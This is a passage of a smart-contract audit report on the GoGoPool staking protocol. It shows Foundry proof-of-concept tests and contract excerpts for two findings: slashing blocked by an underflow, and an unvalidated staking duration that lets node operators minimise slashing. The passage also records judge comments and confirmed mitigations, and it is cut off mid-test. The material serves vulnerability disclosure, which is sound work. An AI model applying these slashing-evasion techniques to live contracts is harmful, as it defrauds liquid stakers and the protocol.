class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// staking cannot end because of underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p>The only thing the protocol can do now is to call <code>recordStakingError</code> for the minipool, since no other state changes are allowed. This will return the staked funds but it will not slash the <code>GGP</code> amount for the node operator. Hence the node operator has evaded the slashing.</p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vs code, forge</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If the amount to be slashed is greater than what the node operator has staked, slash all their stake.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/494#issuecomment-1416338579\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a risk to the protocol, in cases in which the price of GPP drops too low, slashing could not be performed.</p>\n<p>In contrast to other reports, this is a finding that shows an issue with the system and it’s consequences, more so than an economic attack.</p>\n<p>For this reason I believe Medium to be the most appropriate severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>If staked GGP doesn’t cover slash amount, slash it all: <a href=\"https://github.com/multisig-labs/gogopool/pull/41\">multisig-labs/gogopool#41</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/56\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/38\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"m-14-any-duration-can-be-passed-by-node-operator\" style=\"position:relative;\"><a href=\"#m-14-any-duration-can-be-passed-by-node-operator\" aria-label=\"m 14 any duration can be passed by node operator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/492\">[M-14] Any duration can be passed by node operator</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/492\">immeas</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/880\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/841\">V_B</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/345\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/215\">0xdeadbeef0x</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/138\">0x73696d616f</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L196-L269\">https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L196-L269</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L560\">https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L560</a></p>\n<p>When a node operator creates a minipool they pass which duration they want to stake for. There is no validation for this field so they can pass any field:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">197:\t\t</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">nodeID</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">198:\t\t</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">duration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">199:\t\t</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">delegationFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">200:\t\t</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">avaxAssignmentRequest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:\t) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">whenNotPaused</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...     </span><span class=\"mtk3\">// no validation for duration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.status&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Prelaunch</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// duration stored</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.delegationFee&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">delegationFee</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Later when staking is done. if the node op was slashed, <code>duration</code> is used to calculate the slashing amount:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">557</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">558</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpectedAVAXRewardsRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">561</span><span class=\"mtk1\">:\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">670</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The node operator cannot pass in <code>0</code> because that reverts due to zero transfer check in Vault. However the node operator can pass in <code>1</code> to guarantee the lowest slash amount possible.</p>\n<p>Rialto might fail this, but there is little information about how Rialto uses the <code>duration</code> passed. According to this comment they might default to <code>14 days</code> in which this finding is valid:</p>\n<blockquote>\n<p>JohnnyGault — 12/30/2022 3:22 PM</p>\n</blockquote>\n<blockquote>\n<p>To clarify duration for everyone — a nodeOp can choose a duration they want, from 14 days to 365 days. But behind the scenes, Rialto will only create a validator for 14 days. …</p>\n</blockquote>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The node operator can send in a very low <code>duration</code> to get minimize slashing amounts. It depends on the implementation in Rialto, which we cannot see. Hence submitting this.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>PoC test in <code>MinipoolManager.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingEndWithSlashZeroDuration</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// zero duration causes vault to fail on 0 amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 